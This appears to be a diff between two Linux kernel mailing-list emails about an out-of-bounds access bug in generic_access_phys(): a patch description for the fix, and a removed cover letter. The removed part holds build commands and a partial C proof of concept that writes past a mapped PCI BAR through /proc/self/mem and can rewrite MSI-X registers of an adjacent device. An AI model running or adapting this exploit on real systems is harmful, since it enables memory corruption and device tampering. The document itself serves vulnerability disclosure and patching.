@@ -4,90 +4,91 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from kanga.kvack.org (kanga.kvack.org [205.233.56.17])
 	(using TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id CA397C44529
-	for <linux-mm@archiver.kernel.org>; Tue, 21 Jul 2026 14:26:17 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id AE8CFC44529
+	for <linux-mm@archiver.kernel.org>; Tue, 21 Jul 2026 14:26:22 +0000 (UTC)
 Received: by kanga.kvack.org (Postfix)
-	id A2C266B008C; Tue, 21 Jul 2026 10:26:16 -0400 (EDT)
+	id A06716B00A6; Tue, 21 Jul 2026 10:26:21 -0400 (EDT)
 Received: by kanga.kvack.org (Postfix, from userid 40)
-	id 9B6836B0096; Tue, 21 Jul 2026 10:26:16 -0400 (EDT)
+	id 9B7976B00C0; Tue, 21 Jul 2026 10:26:21 -0400 (EDT)
 X-Delivered-To: int-list-linux-mm@kvack.org
 Received: by kanga.kvack.org (Postfix, from userid 63042)
-	id 8569F6B00A6; Tue, 21 Jul 2026 10:26:16 -0400 (EDT)
+	id 8A5C36B00C2; Tue, 21 Jul 2026 10:26:21 -0400 (EDT)
 X-Delivered-To: linux-mm@kvack.org
-Received: from relay.hostedemail.com (smtprelay0010.hostedemail.com [216.40.44.10])
-	by kanga.kvack.org (Postfix) with ESMTP id 443396B008C
-	for <linux-mm@kvack.org>; Tue, 21 Jul 2026 10:26:16 -0400 (EDT)
-Received: from smtpin20.hostedemail.com (lb01a-stub [10.200.18.249])
-	by unirelay10.hostedemail.com (Postfix) with ESMTP id C1562C01B1
-	for <linux-mm@kvack.org>; Tue, 21 Jul 2026 14:26:15 +0000 (UTC)
-X-FDA: 85013008710.20.28A7FAC
-Received: from mail-pf1-f181.google.com (mail-pf1-f181.google.com [209.85.210.181])
-	by imf09.hostedemail.com (Postfix) with ESMTP id 0BCE014000E
-	for <linux-mm@kvack.org>; Tue, 21 Jul 2026 14:26:13 +0000 (UTC)
-Authentication-Results: imf09.hostedemail.com;
-	dkim=pass header.d=gmail.com header.s=20251104 header.b=mQk8CYmo;
-	spf=pass (imf09.hostedemail.com: domain of enjou1224z@gmail.com designates 209.85.210.181 as permitted sender) smtp.mailfrom=enjou1224z@gmail.com;
+Received: from relay.hostedemail.com (smtprelay0017.hostedemail.com [216.40.44.17])
+	by kanga.kvack.org (Postfix) with ESMTP id 56B656B00A6
+	for <linux-mm@kvack.org>; Tue, 21 Jul 2026 10:26:21 -0400 (EDT)
+Received: from smtpin27.hostedemail.com (lb01a-stub [10.200.18.249])
+	by unirelay01.hostedemail.com (Postfix) with ESMTP id CBAA61C00B9
+	for <linux-mm@kvack.org>; Tue, 21 Jul 2026 14:26:20 +0000 (UTC)
+X-FDA: 85013008920.27.89771DE
+Received: from mail-pf1-f175.google.com (mail-pf1-f175.google.com [209.85.210.175])
+	by imf20.hostedemail.com (Postfix) with ESMTP id 13EBF1C000C
+	for <linux-mm@kvack.org>; Tue, 21 Jul 2026 14:26:18 +0000 (UTC)
+Authentication-Results: imf20.hostedemail.com;
+	dkim=pass header.d=gmail.com header.s=20251104 header.b=f2TGoGNi;
+	spf=pass (imf20.hostedemail.com: domain of enjou1224z@gmail.com designates 209.85.210.175 as permitted sender) smtp.mailfrom=enjou1224z@gmail.com;
 	dmarc=pass (policy=none) header.from=gmail.com
 ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
-	s=arc-20220608; t=1784643974;
+	s=arc-20220608; t=1784643979;
 	h=from:from:sender:reply-to:subject:subject:date:date:
 	 message-id:message-id:to:to:cc:cc:mime-version:mime-version:
 	 content-type:content-transfer-encoding:content-transfer-encoding:
-	 in-reply-to:references:dkim-signature;
-	bh=osLIikjLm/wHb9USOVWA5AXNj0oMUDP0p1YYS5t0Rrc=;
-	b=e/a86mgYLB6FZpA6ZamV0v4ns67mSwxIy1s+G0d13OUPmgu+1Ruc+0Zyh5KeTEJqXvM9iV
-	kiPnM/SFzu8SgDiiCR1cGNR8Q1IkQ4yct23Am4pr6zhSmG+IP90E+A3mZQoNo+UQWy4fiY
-	Ph31L+R6Yq3U7Fya+hHaBIU7nOZ9DqY=
-ARC-Seal: i=1; a=rsa-sha256; d=hostedemail.com; s=arc-20220608; cv=none;
-	t=1784643974;
-	b=Xe65Zr5BfcmmFfMP0avPdy2z+dtnF8pilCFfZ/Ut2k54efYWha0Yq2zgbaQIFndGPvOMu9
-	OOQWyqxoLECz9+u6ZpyJHjBHStCaUs6dHZPFyQfzmx5uypDNUZ5uVWC8P+jubkl0Fw18uF
-	Vr8Ma5qOssgDM/w7qCr1+cQzw/r620A=
+	 in-reply-to:in-reply-to:references:references:dkim-signature;
+	bh=RfQ7lBIrWKrgOrRh6zBOJZcgVY+erDBJr0XtlKK6s84=;
+	b=zBcl54BiTRNA4mTj4J57rlhwnpy3P8NXpMB/riS+dvrFiDP4yLzDrO40XeFZJ5bu56jwnJ
+	98kBFpzUdPjCo8xBCDMyRUjGzonXjXh59pQfF+Tb3Fs/rWH/tdlB3mEUBBClUrpAdk8SnB
+	8Bu8fMrL2KDVepiGjz2sCV1OYLpjuSQ=
 ARC-Authentication-Results: i=1;
-	imf09.hostedemail.com;
-	dkim=pass header.d=gmail.com header.s=20251104 header.b=mQk8CYmo;
-	spf=pass (imf09.hostedemail.com: domain of enjou1224z@gmail.com designates 209.85.210.181 as permitted sender) smtp.mailfrom=enjou1224z@gmail.com;
+	imf20.hostedemail.com;
+	dkim=pass header.d=gmail.com header.s=20251104 header.b=f2TGoGNi;
+	spf=pass (imf20.hostedemail.com: domain of enjou1224z@gmail.com designates 209.85.210.175 as permitted sender) smtp.mailfrom=enjou1224z@gmail.com;
 	dmarc=pass (policy=none) header.from=gmail.com
-Received: by mail-pf1-f181.google.com with SMTP id d2e1a72fcca58-84847482584so3834040b3a.0
-        for <linux-mm@kvack.org>; Tue, 21 Jul 2026 07:26:13 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; d=hostedemail.com; s=arc-20220608; cv=none;
+	t=1784643979;
+	b=4+ng/BpwE5HsUt3zmVTcMJZ4geumjTkJ8UgEWaG7+OcswBrowM+OFxHbqxQEusEuKVaa2w
+	BTFottJzwYMpGm102SrZAL5qv0ktKIflAocrcH7WDyY9gyJZyfeMqiy9r9iAYObzqUUYBX
+	YNwOY63ADJ+id/TQ8BHTlL5/tl8Phug=
+Received: by mail-pf1-f175.google.com with SMTP id d2e1a72fcca58-845b6d9bf39so4884920b3a.1
+        for <linux-mm@kvack.org>; Tue, 21 Jul 2026 07:26:18 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1784643973; x=1785248773; darn=kvack.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=osLIikjLm/wHb9USOVWA5AXNj0oMUDP0p1YYS5t0Rrc=;
-        b=mQk8CYmogQf+R8W7EEJjDjzTd0rXWdZBO8KWDF0fvCY9Q3QyfFfHZXpUBCKqfTS7AH
-         UxIB7Pg5/CqO1iYoPa6/Cdx/I7L6zKKDiGlsQPFZjBICsHrC3JT/hZQqb3PcY0QwpaRl
-         1we+HUL5U2X7heGnl9YxgAq/yUWPaWE6DGL9X9Gz63w3UBshRGpGUBtCkS4g7/nz5xMU
-         +0m0usECPulZfZyYKvws/Ltj8lrQZsgeqwL3ILvHHi1feRy7K/+oyI/+DM/mjPHouQsj
-         xoCwl8FnjvRk5P8r1R2ZlHskSsh2osjaVmVTE6j7Fws/EWauJdoYvyxbkefERnRQa7ZQ
-         /z6A==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1784643973; x=1785248773;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=gmail.com; s=20251104; t=1784643978; x=1785248778; darn=kvack.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=osLIikjLm/wHb9USOVWA5AXNj0oMUDP0p1YYS5t0Rrc=;
-        b=MX2nSk+dMpyJjzbNmRxB6xUe0MzRGUvZRRGg3Asmc1p9S8t+gsbuHk5yOsTwc6BJ8V
-         LF7hENcIzMiaJlcEmJfIsTUXWm5DuATnXJjdNa7jn+bYW0awK1vwAdEVG3N5ixH6Q9Hk
-         DQqvbuLQ/y9hr2QB42ftkbP0n/5L5UnFwNY2eBq3zo+XZs3c5gak6Jvuoyt1CSLoXGjU
-         MTQZdLRAEg244VNdK80hMmu/mGKo5VbkoXQRBmuAf49X7d+sjUCDoLpsinvGL+f7LAeA
-         DeRvubAhwd7ILI+tj0QNLNCVVeunWb2Bt6uOWBit46mCxBI5v+mJ3ShFJSnDmEHZkyHN
-         xd9g==
-X-Gm-Message-State: AOJu0YyyAs0s+tvcDT4UYusuI8To2yMxivTtaqPBlfVZ49pVfzTYRW/U
-	UMOS0phSwzmS7LcoObL/dgDN+Q76H83NCcEFZRVIoW6d/f5EJfls4ysciUr619GY
-X-Gm-Gg: AR+sD139WWyaPnP91veJW/DFgRmFfMEHfSXmHhOMPG0o7PgUqj+FUJwLDqdRd29b12m
-	kq0/jrtlUh55qBLKzOaz4K4GOK8ecA7dfhBz4c58YGYPISPi7LC0/qjpxjAc5AeO3azp++n6GFy
-	aqxgGlojSFbu3lombACb3AQxPUMnjTmAGmnEYRHQ2d1s9ASrZA/k48vO00SQF/crIdZ2tON0ZnJ
-	XmoBvsrVOb/cQlonQGsgbVq/ioN1qbpy+R5FMjafM9S3OQyqOgH3xTKZrleIWTm3Fua5RDw+nV+
-	dyVbcm1PKE+j966gtvn5CzBuE8H1pcmAtkf0dwJzYxXUvzpOUAYPbPYbeb3WtnLF/XdO/5/yctr
-	vBwLpyNebaKIArNUi2fBSGD7DCQ1cA4aOph6ADa66qXQ/KAQXSp/4zXzVfT0vMSJYdqR80MyXtF
-	xaQsIzI0sySeVQamSY2w==
-X-Received: by 2002:a05:6a00:1390:b0:848:2f58:e1e9 with SMTP id d2e1a72fcca58-84beb54b717mr24287612b3a.36.1784643972625;
-        Tue, 21 Jul 2026 07:26:12 -0700 (PDT)
+        bh=RfQ7lBIrWKrgOrRh6zBOJZcgVY+erDBJr0XtlKK6s84=;
+        b=f2TGoGNiyRFWmXX2gMr4h+FwOg6K0Sl7HjpoMkHMsJ54lxTi0Vala5yPRl/xE9eHx7
+         +XA/fOJLodK40R0WaxYQ1qocYizHVRvHr4vc4ZI/J9LOvvWHP01rnkKaCEJE2V5LD6r8
+         pOzjyy+2sXMTq50HrG+V1nb75m8SBEuAi8ujSgKqaQGqDCE8cNd0EcEU6eAK8VhGQZdu
+         RIGgEvstK4fvxIIvV9RPAzWnWcAiQeeuyULFow1qXu5mjZmmn0LV2bndUP6DuPIw30AA
+         AGeWe4hUDyEkC02gH/D8luGSU9uAUv6d235Ov+IiwlsVNVAmR9928ix46T7N9be7Nq/N
+         Tqkg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1784643978; x=1785248778;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=RfQ7lBIrWKrgOrRh6zBOJZcgVY+erDBJr0XtlKK6s84=;
+        b=H4JcTgzo6NQAy3uOinRq0zNWSRf8laJ3k4wnPXx86lYhS+cvdDR6ZZOM1PiDCaJlWy
+         7ea0sP8hAfDBXgit5KlKFuUcaP5Xu+DhctvSiH0RO6ab1gCYhH/a5RsB8dNo1ydUda0t
+         9Z3NzwTpfyfWA/Nl70PwOuchVJI6HviQxiSmWRmwZKNkeMYcPE7NB8nfRNHxTPlqFEWx
+         fnNE7nRKdZc0aI3X4lR2cprvYy3blxjc1zZ6Klvl0W+y6syE4qZGt42vm7Ocr2+dw2EC
+         zqJpiWh4GaR6JR9/Hbb+L7WSrNLtztr/Q/Og/VyrfgxQPlrsNNmeJBlf39lJTSzSpEs9
+         uIMA==
+X-Gm-Message-State: AOJu0YzYVW2T0HTgQb/g6PJGLmdEzrEXeJssCDEy4F5MGaydD3lFKBWi
+	AEIY7LI0SnfoCoO0v4NYt2wqSCkYSTJgytQVQI2MYk59jImgCBjnGviTNSfhi8EF
+X-Gm-Gg: AR+sD11mQp6ZUe9pHneewsoJh1RzXTOc3cX4gClRtMFohZhGodN/fe+YGOZuu11S+sn
+	aB0YsycKinkIbPuqH4hSw/oOpJTavsrnP0rHrT5JI9i4HX2QoV8AOWWV6ins0qKFTs4TOxMgGqF
+	59+SDr4NqoUHGGRGRD5Tc0JHwMfM8T8NsPVUwAQEpJbV60liTKl/J54xjPq6kVUugyrrOIEhDqQ
+	f34xGjNTXR4eTXQmElPFW3NcappXYmMkFFFAiziWygMxpwMtX45ZUcq2KvDm8Qw5osSueZwKHK7
+	SmgpxQ1yEngCjk0nnrhu9ZRpIa/sCjM2FTS4MQBEDAbm/dqevrbv1q5hHyJyXT7bZsuK49eWPnq
+	8AZHX1AQc5QexlHuTSHR3rIdBA50dLrpz6x2OZl3kChQhhhYugq8bB0XWatnpsvOA8UxGePd/YE
+	cCI38hEREedZOsuLF4Aw==
+X-Received: by 2002:a05:6a00:2294:b0:848:55a6:fbe with SMTP id d2e1a72fcca58-84c28c948b3mr17278814b3a.35.1784643977877;
+        Tue, 21 Jul 2026 07:26:17 -0700 (PDT)
 Received: from enjou-Legion-Y7000P-2019 ([144.48.80.242])
-        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84c2af7acf4sm7647371b3a.51.2026.07.21.07.26.07
+        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84c2af7acf4sm7647371b3a.51.2026.07.21.07.26.13
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Tue, 21 Jul 2026 07:26:12 -0700 (PDT)
+        Tue, 21 Jul 2026 07:26:17 -0700 (PDT)
 From: Ren Wei <enjou1224z@gmail.com>
 To: linux-mm@kvack.org
 Cc: akpm@linux-foundation.org,
@@ -102,20 +103,22 @@ Cc: akpm@linux-foundation.org,
 	vega@nebusec.ai,
 	rakukuip@gmail.com,
 	enjou1224z@gmail.com
-Subject: [PATCH 0/1] mm: fix out-of-bounds access in generic_access_phys
-Date: Tue, 21 Jul 2026 22:26:03 +0800
-Message-ID: <cover.1784428532.git.rakukuip@gmail.com>
+Subject: [PATCH 1/1] mm: fix out-of-bounds access and race in generic_access_phys
+Date: Tue, 21 Jul 2026 22:26:04 +0800
+Message-ID: <f618e2f57ad0086a8d7a95cb17dcf5a1f0cf0e45.1784428532.git.rakukuip@gmail.com>
 X-Mailer: git-send-email 2.51.0
+In-Reply-To: <cover.1784428532.git.rakukuip@gmail.com>
+References: <cover.1784428532.git.rakukuip@gmail.com>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
-X-Rspamd-Server: rspam10
-X-Rspamd-Queue-Id: 0BCE014000E
-X-Stat-Signature: 4ndag9hwegfw7cxhitap9ofnfcny17n7
 X-Rspam-User: 
-X-HE-Tag: 1784643973-972951
-X-HE-Meta: U2FsdGVkX19ATpO42TzAkSIwFWD18M21yHo8zlyctWMEwng+ND7b9yyLW7OTi2ZXCudDQ9kMFNaxRaVKbRW4wnhYiiFAKdRnSDtTo4Tm2Thwt7R3XPYrJouOKevqb4NKmrN5VSgFlkfzcqisqzcmTzSm2JtzAcR8PrPpz89YqKfEIJfGEDDSFqu/RSXixKUUmIkzo3B7AaliD8In1+JtjzIfIkR5FcpTyrzptCTjvDJXIE1L3P9yoNc9luXjCZPaEu5o/VhzUcyAj8xIPhjIZ+75eO1gbKv/8gDeWWKzPU1Magjmtc+G2lcF/6dR6XEYHf0vvxOd7+ZRslKKg8hh2dJ6mPwFlbMGqxo4oy5vy1aBr3BWtb1ixgNDdOMxGMb2PPejAJxar3J7VxAqybZIxaWEsH+dnXBroUwMWpWEyUiL1jZj7lSQ7Vy655GsJ/UAlfR5PNC0gEDUnsjGCLqDQslvrT7ZzBKQzyRe+wZQFRYKRpLDnvpolD9n13Y4zXuEIv5tv80R1LgJ4rkAKAjsALVxktNIcyIsJU++JRxGhPkqgNI1owMbiOGswM47alcMWrEvSZ4Yunv1iu4gn3KPw/9g9PwGrOwhlJwTd5wb8BYaFuMpHxeGQilb8X4KXI8ngcFR3ao21XIhxDHcNedu9pcqQ35kHquWGOGXXL0XdDU/UivnVmyU1MXHD9WQRd7Rc6ocP3KDSAM9oYDCkGbloIcfFYgWpdqorVN0zO7A8iSaHXHi87waJpP0yGatb8PoGCVwyd3OFtaN5qja/JLHfdcBCXTfziNXV+TAi+0s20PqRLuUDAu/0tO3i8to/G5atcheTAcFvmbXSyXyK/EYY63IsvsHlpA89CjEsDi5YCCrHbDSBQj8dHPyLe1WSzPX/zHQ8w9eCbvvrDE/CvRW072jI69qeIRbOWAT4BT/6QkuX84JI96rlKbzRpw5Zpl6rsV24PdQ26UvE6CA6sz
- 02o7sEKj
- eycZhLnFdymPhIKwYWEF2B9iaqq2Jo8Or27W+mo0mIK4Mdf/8R9I/oEi7r3agQsRbNABEEblR2nP25XK12Ux1u6bSu3WgIVb6nGuvsqUZvZpBxVZsXM48DZHglavBam6gRliHyEkJYlALa5UvZCorVV0ktYTwMIJkhjhqzejmSHNmvb7OgOrE6rF3RyJeez6Hjy13BJNGGklY15ok76UK/oLuphQTljJg08qnjEvsU2J9Pio+pWgPhkoXxFlHXMaGoH7UMUaCBu01Z+KthbewMoFBhE6+9DMnhu0xIcRKUv1KaDfByrc+zUSbw5EJ4N/tVdfVYSSMQCfI06ylxQX7zNC7wimLksPal+OMywaZOACTBMuslwX9E30YlImEbWQpGseqqetQhkJlD+jPh1e4ULEY/BnZyYYCin/8MhGx68bYhz477oKOqHnjyCY7hFAj4vJ8Z7+shL5Od8V2Daj96KisRA==
+X-Rspamd-Queue-Id: 13EBF1C000C
+X-Rspamd-Server: rspam01
+X-Stat-Signature: ma9y3wun53m37tu1kgs1zf8nnarw16xy
+X-HE-Tag: 1784643978-220585
+X-HE-Meta: U2FsdGVkX1+eBdU4GOXZfUdDK+oIWFPQ1kL3BFrZtgxb2G+jr8FUirR79NONHtK/Nrk1hutOo+G9sTOfKyEngNLjBrFA9N9bSABzvDO2QjITcJ3QDRxzScz9u6yAf/RzkiuBtfgBIhJasqTbFLLP8EJolGOW5z/bWSoeYDWltrYUXiqjpwz6hijW3KtWCWNFraNF7j6BAHjBukS1OhKXaVMv/TCZRfxc3YR+IsDFBTnsJkABUnRpOAhUQav+d8/0vUIxaw8M5CSGbExgsOvYfhLBbJz757WGLmZzmyyCnCr54CRgUX8o045GJ/VmKbZUntuYuRDrVVMvPYF5z+pfPbsDe5zX/7Pb+7Zx0d4CHsTmA03F4Aei2D/niM48Jt43PJU2Ay9kQoq4rsXEtqWI2eeMk2qrtdKzWG/IYTw7a9/cpJyGHokSeEB+eA8JHq26sp0U3+p8Gzm3JPWqO8PBrJukK5PXbeudLIt8kMRRSHw6GMllfkWW9bs+9/4CS6UfysxP7hE8FYFsP3pjjUgDfJ5Uivzki25ST7eZGTcQiGEo27KnZvQTsFnew4iIdgpgZevB//vVU8GByqTu72SJTxPMzS6EgjZBwsmYvTXljMOc4sitnkVaC+f01FWda1pFtO/qFB6gYGFIg2vyX+mhCXXgeRIrMr7XIp8XTswfhXI4G7HFR7Zn0Id/xTUSjtOGrXD2DjeJJw265aE5NDhtdJoeyljVd74jvpLucL6rWOyewOfR421o25YLoHxq+guUYqwLZuA332NiTtRVgaSxPY3CNeBw+O5XXAbbxma7/R+qQ7PgQfDUc+S8YBH6p6D5i0LKq9LdMLEuiESkFyEmzi3E87imHgfG5hoem3QdlQpSpSFGm/B7ZwYJAkSmdv1aM+PjT5OUKOHKxzrj4RczEnIQm9prsnndgPlHxJDNONJxc2iZ/rWcgCbg3l7Za8OlAf24hHl3ElTFj4g6Myu
+ G8DOdXBW
+ uKKiDE76RUt3MNIJvjlqKTa/hkNpv+KXovxpJ3tBBjbgR/jzuEECw9AKOn0xlIbRWhsZ8I1SBzEaovuiKLBh2tCp4ixyElb8HFC70PeSc+9TJ85Xw6cFWOIsvEAjOJ1rOjkqzrOyEWe/IUgt1KaoTlc2nt/AuUCil9fwibbzCYVZraSFMDT5J5Bt77WTbZF33O4M0BFv1UJC8mBa9B5+ciFm6N2d1NzlG/qPVgyhl7xQ4X3cL+5Hk/sYK+MqMdMi9ip0ZJN62VglT5KLU3W4v20HWMooIGstEYcaVAFsVhi8Wr6l8O+x5W0aXmk9Mnvg/id+K6Ax/d/Yb7kVzaq2PGJVCmjqqOP/qjrgQ2z2yyMHffsl0s95zgk5AXKpvzeD2T8l+RAeKhI3pL3rNzNZpdDV53+zIMpcaNVfoGtZYr95ZV9Mh4YiN6ZZtHEz52Gj5d/xMbIe1rJOB+/vuElwo8tYSdafsC4BcIS53GaJZgLkpXfI=
 Sender: owner-linux-mm@kvack.org
 Precedence: bulk
 X-Loop: owner-majordomo@kvack.org
@@ -125,433 +128,138 @@ List-Unsubscribe: <mailto:majordomo@kvack.org>
 
 From: Luxiao Xu <rakukuip@gmail.com>
 
-Hi Linux kernel maintainers,
+generic_access_phys() improperly validates the memory access range. It
+only validates the start address using follow_pfnmap_start() and then
+uses ioremap_prot() to map the entire requested length. This fails to
+verify if the access range stays within the VMA boundaries or if it
+crosses into adjacent physical/MMIO mappings, allowing out-of-bounds
+read or write access.
 
-We found and validated an issue in mm/memory.c. The bug is reachable by a non-root user via /proc/self/mem. We've tested it, and the proposed fix addresses the vulnerability without affecting other functionality.
+Furthermore, the previous implementation failed to handle partial
+progress semantics required by __access_remote_vm() and lacked
+necessary concurrency checks (retry logic) to prevent the use of
+stale mappings after releasing the PFNMAP lock.
 
-We provide the detailed information about the bug below, along with a PoC to trigger it.
+Fix this by:
+- Processing memory access in page-sized chunks, ensuring every page
+  is validated within its VMA boundaries.
+- Introducing a retry mechanism to re-validate the PFN/protection
+  after mapping, ensuring safety against concurrent page table
+  modifications.
+- Returning the total number of bytes successfully copied to satisfy
+  the partial progress semantics of the access_process_vm
+  infrastructure.
 
----- details below ----
-
-Bug details:
-
-The generic_access_phys() function in mm/memory.c fails to properly validate the memory access range when handling requests, such as those made via /proc/self/mem. It validates only the start address using follow_pfnmap_start() and then proceeds to ioremap the entire requested length. It does not verify if the access range stays within the VMA boundaries or if it crosses into adjacent physical/MMIO mappings.
-
-This behavior allows an attacker to perform out-of-bounds (OOB) reads or writes by providing a length that spans across the end of the current VMA, leading to unauthorized access to adjacent memory regions.
-
-The fix involves iterating through the access request in page-sized chunks. For each chunk, we verify the validity of the current PFNMAP entry, map only the necessary page, perform the I/O operation, and immediately unmap it. This ensures the access is strictly bound to authorized memory regions.
-
-Reproducer:
-
-gcc -O2 -static -o poc poc.c
-unshare -Urn ./poc
-
-We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
-
-------BEGIN poc.c------
-#define _GNU_SOURCE
-#define _FILE_OFFSET_BITS 64
-
-#include <errno.h>
-#include <fcntl.h>
-#include <inttypes.h>
-#include <stdbool.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/mman.h>
-#include <sys/stat.h>
-#include <sys/types.h>
-#include <unistd.h>
-
-#define PAGE_SZ 4096U
-#define DEFAULT_BASE "/sys/bus/pci/devices/0000:00:02.0/resource2"
-#define DEFAULT_NEXT "/sys/bus/pci/devices/0000:00:03.0/resource1"
-
-struct config {
-	const char *base_path;
-	const char *next_path;
-	size_t tail;
-	size_t cmp_len;
-	bool do_write;
-	bool keep_corruption;
-	bool rewrite_msix_data;
-	uint32_t msix_data;
-	bool rewrite_msix_addr_low;
-	bool rewrite_msix_addr_high;
-	uint32_t msix_addr_low;
-	uint32_t msix_addr_high;
-};
-
-static void usage(const char *prog)
-{
-	fprintf(stderr,
-		"Usage: %s [--base PATH] [--next PATH] [--tail N] [--cmp-len N] [--write] [--keep-corruption]\n"
-		"          [--rewrite-msix-data HEX] [--rewrite-msix-addr-low HEX]\n"
-		"          [--rewrite-msix-addr-high HEX]\n"
-		"\n"
-		"Default target maps QEMU's 4 KiB VGA BAR (00:02.0 resource2) and\n"
-		"uses /proc/self/mem to read or write past that VMA into the adjacent\n"
-		"virtio-net MSI-X BAR page (00:03.0 resource1).\n",
-		prog);
-}
-
-static void die_perror(const char *what)
-{
-	perror(what);
-	exit(EXIT_FAILURE);
-}
-
-static size_t parse_size(const char *arg, const char *name)
-{
-	char *end = NULL;
-	unsigned long long value;
-
-	errno = 0;
-	value = strtoull(arg, &end, 0);
-	if (errno || !end || *end) {
-		fprintf(stderr, "invalid %s: %s\n", name, arg);
-		exit(EXIT_FAILURE);
-	}
-	if (value == 0 || value > PAGE_SZ) {
-		fprintf(stderr, "%s must be in range 1..%u\n", name, PAGE_SZ);
-		exit(EXIT_FAILURE);
-	}
-	return (size_t)value;
-}
-
-static uint32_t parse_u32(const char *arg, const char *name)
-{
-	char *end = NULL;
-	unsigned long long value;
-
-	errno = 0;
-	value = strtoull(arg, &end, 0);
-	if (errno || !end || *end || value > UINT32_MAX) {
-		fprintf(stderr, "invalid %s: %s\n", name, arg);
-		exit(EXIT_FAILURE);
-	}
-	return (uint32_t)value;
-}
-
-static void parse_args(int argc, char **argv, struct config *cfg)
-{
-	int i;
-
-	*cfg = (struct config) {
-		.base_path = DEFAULT_BASE,
-		.next_path = DEFAULT_NEXT,
-		.tail = 16,
-		.cmp_len = 64,
-		.do_write = false,
-		.keep_corruption = false,
-		.rewrite_msix_data = false,
-		.msix_data = 0,
-		.rewrite_msix_addr_low = false,
-		.rewrite_msix_addr_high = false,
-		.msix_addr_low = 0,
-		.msix_addr_high = 0,
-	};
-
-	for (i = 1; i < argc; i++) {
-		if (!strcmp(argv[i], "--base") && i + 1 < argc) {
-			cfg->base_path = argv[++i];
-		} else if (!strcmp(argv[i], "--next") && i + 1 < argc) {
-			cfg->next_path = argv[++i];
-		} else if (!strcmp(argv[i], "--tail") && i + 1 < argc) {
-			cfg->tail = parse_size(argv[++i], "tail");
-		} else if (!strcmp(argv[i], "--cmp-len") && i + 1 < argc) {
-			cfg->cmp_len = parse_size(argv[++i], "cmp-len");
-		} else if (!strcmp(argv[i], "--write")) {
-			cfg->do_write = true;
-		} else if (!strcmp(argv[i], "--keep-corruption")) {
-			cfg->keep_corruption = true;
-		} else if (!strcmp(argv[i], "--rewrite-msix-data") && i + 1 < argc) {
-			cfg->do_write = true;
-			cfg->rewrite_msix_data = true;
-			cfg->msix_data = parse_u32(argv[++i], "rewrite-msix-data");
-		} else if (!strcmp(argv[i], "--rewrite-msix-addr-low") && i + 1 < argc) {
-			cfg->do_write = true;
-			cfg->rewrite_msix_addr_low = true;
-			cfg->msix_addr_low = parse_u32(argv[++i], "rewrite-msix-addr-low");
-		} else if (!strcmp(argv[i], "--rewrite-msix-addr-high") && i + 1 < argc) {
-			cfg->do_write = true;
-			cfg->rewrite_msix_addr_high = true;
-			cfg->msix_addr_high = parse_u32(argv[++i], "rewrite-msix-addr-high");
-		} else {
-			usage(argv[0]);
-			exit(EXIT_FAILURE);
-		}
-	}
-
-	if (cfg->tail + cfg->cmp_len > PAGE_SZ) {
-		fprintf(stderr, "tail + cmp-len must fit within a single 4 KiB access\n");
-		exit(EXIT_FAILURE);
-	}
-}
-
-static int open_rw(const char *path)
-{
-	int fd = open(path, O_RDWR | O_SYNC);
-
-	if (fd < 0)
-		die_perror(path);
-	return fd;
-}
-
-static void *map_page(int fd, off_t offset, const char *name)
-{
-	void *map;
-
-	map = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset);
-	if (map == MAP_FAILED)
-		die_perror(name);
-	return map;
-}
-
-static void hexdump(const char *label, const unsigned char *buf, size_t len)
-{
-	size_t i;
-
-	printf("%s (%zu bytes):", label, len);
-	for (i = 0; i < len; i++) {
-		if (!(i % 16))
-			printf("\n  %04zx:", i);
-		printf(" %02x", buf[i]);
-	}
-	printf("\n");
-}
-
-static ssize_t checked_pread(int fd, void *buf, size_t len, off_t off, const char *what)
-{
-	ssize_t ret = pread(fd, buf, len, off);
-
-	if (ret < 0)
-		die_perror(what);
-	return ret;
-}
-
-static ssize_t checked_pwrite(int fd, const void *buf, size_t len, off_t off, const char *what)
-{
-	ssize_t ret = pwrite(fd, buf, len, off);
-
-	if (ret < 0)
-		die_perror(what);
-	return ret;
-}
-
-int main(int argc, char **argv)
-{
-	struct config cfg;
-	unsigned char *base_map;
-	unsigned char *next_map;
-	unsigned char *buf;
-	unsigned char *base_tail;
-	unsigned char *next_bytes;
-	unsigned char *payload;
-	unsigned char *saved_next;
-	size_t total_len;
-	size_t i;
-	int base_fd;
-	int next_fd;
-	int mem_fd;
-	ssize_t ret;
-	off_t mem_off;
-	int rc = EXIT_FAILURE;
-
-	parse_args(argc, argv, &cfg);
-	setvbuf(stdout, NULL, _IONBF, 0);
-	setvbuf(stderr, NULL, _IONBF, 0);
-
-	total_len = cfg.tail + cfg.cmp_len;
-	base_fd = open_rw(cfg.base_path);
-	next_fd = open_rw(cfg.next_path);
-	mem_fd = open("/proc/self/mem", O_RDWR);
-	if (mem_fd < 0)
